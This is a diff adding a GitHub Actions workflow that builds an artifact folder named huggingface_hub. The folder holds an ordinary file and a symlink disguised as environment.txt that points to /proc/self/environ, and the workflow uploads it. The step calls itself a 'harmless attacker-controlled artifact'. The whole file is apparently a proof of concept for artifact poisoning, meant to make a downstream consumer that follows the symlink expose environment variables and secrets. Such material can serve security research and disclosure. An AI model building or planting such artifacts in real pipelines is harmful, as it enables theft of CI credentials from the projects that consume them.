@@ -1,0 +1,28 @@
+name: Symlink Artifact Builder
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - ".github/workflows/symlink-build.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create harmless attacker-controlled artifact
+        run: |
+          mkdir -p build_dir/huggingface_hub
+          printf 'ordinary artifact file\n' > build_dir/huggingface_hub/normal.txt
+          ln -s /proc/self/environ build_dir/huggingface_hub/environment.txt
+          ls -la build_dir/huggingface_hub
+          readlink build_dir/huggingface_hub/environment.txt
+      - name: Upload with exact pinned action
+        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: doc-build-artifact
+          path: build_dir/
